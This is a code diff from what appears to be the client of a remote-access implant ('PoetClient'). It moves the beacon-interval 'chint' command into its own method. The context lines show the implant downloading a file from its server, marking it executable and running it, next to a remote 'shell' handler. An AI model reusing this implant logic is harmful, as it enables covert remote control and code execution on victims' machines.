@@ -152,17 +152,8 @@ class PoetClient(object):
                         s.send('done')
                     except Exception as e:
                         s.send(str(e.message))
-                elif inp.startswith('chint '):
-                    try:
-                        num = int(inp[6:])
-                        if num < 1 or num > 604800:
-                            msg = 'Invalid interval time.'
-                        else:
-                            args.interval = num
-                            msg = 'done'
-                        s.send(msg)
-                    except Exception as e:
-                        s.send(str(e.message))
+                elif inp.startswith('chint'):
+                    self.chint(s, inp)
                 else:
                     s.send('Unrecognized')
             except socket.error as e:
@@ -206,6 +197,29 @@ class PoetClient(object):
             f.write(r.read())
             os.fchmod(f.fileno(), stat.S_IRWXU)
         sp.Popen(tmp, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
+
+    def chint(self, s, inp):
+        """Handle server `chint' command.
+
+        Send back the current delay interval or set it to new value.
+        """
+
+        if inp == 'chint':
+            # no arg, so just send back the interval
+            s.send(str(args.interval))
+        else:
+            # set interval to arg
+            try:
+                num = int(inp[6:])
+                if num < 1 or num > 60*60*24:
+                    msg = 'Invalid interval time.'
+                else:
+                    args.interval = num
+                    msg = 'done'
+                s.send(msg)
+            except Exception as e:
+                s.send(str(e.message))
+
 
     def shell(self, inp, s):
         """Psh `shell' command client-side.
